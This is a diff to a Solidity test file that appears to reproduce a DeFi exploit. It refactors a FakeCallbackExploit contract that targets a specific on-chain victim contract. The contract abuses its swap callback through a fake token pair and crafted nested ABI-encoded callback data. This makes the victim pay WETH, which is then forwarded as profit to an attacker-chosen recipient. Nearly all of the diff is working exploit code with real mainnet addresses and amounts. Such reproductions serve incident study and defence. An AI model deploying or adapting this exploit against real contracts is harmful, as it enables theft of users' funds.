@@ -77,6 +77,7 @@ contract ContractTest is BaseTestWithBalanceLog {
 contract FakeCallbackExploit {
     address private constant VICTIM = 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc;
     address private constant TEMP_TOKEN = 0x67F6965C0B899d12122d116d890A034e05881562;
+    address private constant TEMP_HELPER = 0x25bCC6F744D2b23CE39D8189E151dE4aA621Bb6c;
     address private constant TEMP_PAIR = 0x986a80dE5B3066350Eb921d9D99a9efCa205c2d9;
     address private constant DAI_WETH_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
     address private constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
@@ -87,11 +88,39 @@ contract FakeCallbackExploit {
     uint256 private constant TEMP_PAIR_WETH_OUT = 367_892_963_578_592_963;
     uint256 private constant FLASH_REPAY = 100_300_902_708_124_374;
     uint256 private constant PROFIT_WETH = 267_592_060_870_468_589;
+    uint256 private constant ROUTE_AMOUNT_HINT = 3_071_891_971_238_012_784_039;
+    uint256 private constant HELPER_AMOUNT0_OUT = 2_859_728_258_123_006_471_879_656;
+    uint256 private constant NESTED_PAYMENT_AMOUNT = 2 ether;
+    uint256 private constant ABI_TUPLE_OFFSET = 0x20;
+    uint256 private constant NESTED_TAIL_OFFSET = 0xe0;
+    bytes32 private constant VICTIM_CALLBACK_DATA_HASH =
+        0x7e260cef7057ac72b4717b9474cc0d186496fb819a7be14e22213de9d9e95d17;
 
     IERC20Like private constant WETH = IERC20Like(WETH_ADDRESS);
     IERC20Like private constant FAKE_TOKEN = IERC20Like(TEMP_TOKEN);
 
     address private immutable _recipient;
+
+    struct VictimCallbackPayload {
+        address token0;
+        address token1;
+        uint256 amount0;
+        uint256 amount1;
+        uint256 paymentAmount;
+        address paymentTo;
+        address receiver;
+        VictimSwapHop[] hops;
+    }
+
+    struct VictimSwapHop {
+        address helper;
+        address token0;
+        address token1;
+        uint256 routeAmountHint;
+        uint256 amount0Out;
+        uint256 amount1Out;
+        bytes data;
+    }
 
     constructor(address recipient) {
         _recipient = recipient;
@@ -113,7 +142,9 @@ contract FakeCallbackExploit {
         WETH.transfer(TEMP_PAIR, FLASH_WETH);
         IUniswapV2Pair(TEMP_PAIR).sync();
 
-        IUniswapV2Pair(TEMP_PAIR).swap(1 ether, 0, VICTIM, VICTIM_CALLBACK_DATA);
+        bytes memory victimCallbackData = _victimCallbackData();
+        require(keccak256(victimCallbackData) == VICTIM_CALLBACK_DATA_HASH, "callback data mismatch");
+        IUniswapV2Pair(TEMP_PAIR).swap(1 ether, 0, VICTIM, victimCallbackData);
         require(WETH.balanceOf(TEMP_PAIR) == FLASH_WETH + VICTIM_WETH_PAYMENT, "victim payment mismatch");
 
         IUniswapV2Pair(TEMP_PAIR).sync();
@@ -124,35 +155,45 @@ contract FakeCallbackExploit {
         WETH.transfer(_recipient, PROFIT_WETH);
     }
 
-    bytes private constant VICTIM_CALLBACK_DATA =
-        hex"0000000000000000000000000000000000000000000000000000000000000020"
-        hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
-        hex"00000000000000000000000067f6965c0b899d12122d116d890a034e05881562"
-        hex"0000000000000000000000000000000000000000000000000000000000000000"
-        hex"0000000000000000000000000000000000000000000000000000000000000000"
-        hex"00000000000000000000000000000000000000000000000003bbae1324948000"
-        hex"000000000000000000000000986a80de5b3066350eb921d9d99a9efca205c2d9"
-        hex"0000000000000000000000006883fe4d2ee50941b80b41b8f7f9bf2561d844cc"
-        hex"0000000000000000000000000000000000000000000000000000000000000100"
-        hex"0000000000000000000000000000000000000000000000000000000000000001"
-        hex"0000000000000000000000000000000000000000000000000000000000000020"
-        hex"00000000000000000000000025bcc6f744d2b23ce39d8189e151de4aa621bb6c"
-        hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
-        hex"00000000000000000000000067f6965c0b899d12122d116d890a034e05881562"
-        hex"0000000000000000000000000000000000000000000000a68710a042803a0da7"
-        hex"000000000000000000000000000000000000000000025d922df44933065cbbe8"
-        hex"0000000000000000000000000000000000000000000000000000000000000000"
-        hex"00000000000000000000000000000000000000000000000000000000000000e0"
-        hex"0000000000000000000000000000000000000000000000000000000000000120"
-        hex"0000000000000000000000000000000000000000000000000000000000000020"
-        hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
-        hex"00000000000000000000000067f6965c0b899d12122d116d890a034e05881562"
-        hex"0000000000000000000000000000000000000000000000000000000000000000"
-        hex"0000000000000000000000000000000000000000000000000000000000000000"
-        hex"0000000000000000000000000000000000000000000000001bc16d674ec80000"
-        hex"000000000000000000000000986a80de5b3066350eb921d9d99a9efca205c2d9"
-        hex"0000000000000000000000006883fe4d2ee50941b80b41b8f7f9bf2561d844cc"
-        hex"00000000000000000000000000000000000000000000000000000000000000e0";
+    function _victimCallbackData() private pure returns (bytes memory) {
+        VictimSwapHop[] memory hops = new VictimSwapHop[](1);
+        hops[0] = VictimSwapHop({
+            helper: TEMP_HELPER,
+            token0: WETH_ADDRESS,
+            token1: TEMP_TOKEN,
+            routeAmountHint: ROUTE_AMOUNT_HINT,
+            amount0Out: HELPER_AMOUNT0_OUT,
+            amount1Out: 0,
+            data: _nestedVictimCallbackData()
+        });
+
+        return abi.encode(
+            VictimCallbackPayload({
+                token0: WETH_ADDRESS,
+                token1: TEMP_TOKEN,
+                amount0: 0,
+                amount1: 0,
+                paymentAmount: VICTIM_WETH_PAYMENT,
+                paymentTo: TEMP_PAIR,
+                receiver: VICTIM,
+                hops: hops
+            })
+        );
+    }
+
+    function _nestedVictimCallbackData() private pure returns (bytes memory) {
+        return abi.encode(
+            ABI_TUPLE_OFFSET,
+            WETH_ADDRESS,
+            TEMP_TOKEN,
+            uint256(0),
+            uint256(0),
+            NESTED_PAYMENT_AMOUNT,
+            TEMP_PAIR,
+            VICTIM,
+            NESTED_TAIL_OFFSET
+        );
+    }
 }
 
 contract FakeERC20 {
